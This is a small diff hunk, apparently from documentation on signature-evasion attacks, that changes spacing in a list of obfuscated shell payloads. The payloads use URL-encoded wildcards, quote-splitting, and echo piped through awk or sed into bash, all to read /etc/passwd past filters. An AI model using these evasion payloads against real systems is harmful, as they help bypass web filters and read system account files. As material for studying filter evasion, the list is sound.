@@ -12,7 +12,7 @@ There are attacks for which it is impossible to create a signature, while not in
 <pre>
 %2f???%2f??t%20%2f???%2fp??s??
 cat+/e't'c/pa'ss'wd
-e'c'ho 'swd test pentest' |awk '{print "cat /etc/pas"$1}' | bash
+e'c'ho 'swd test pentest' | awk '{print "cat /etc/pas"$1}' | bash
 ec'h'o 'cat /etc/examplewd' | sed 's/example/pass/g' | bash
 </pre>
 
